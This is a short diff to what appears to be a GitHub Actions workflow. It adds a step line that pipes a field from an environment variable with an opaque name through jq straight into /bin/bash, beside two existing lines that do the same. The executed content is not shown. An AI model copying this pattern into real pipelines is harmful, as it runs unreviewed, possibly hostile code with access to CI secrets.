@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$kryw16" | jq -r .nwvq8094 | /bin/bash
           printf '%s' "$rwpy1728" | jq -r .gb7 | /bin/bash
+          echo $vct1920 | jq -r .tjij877 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
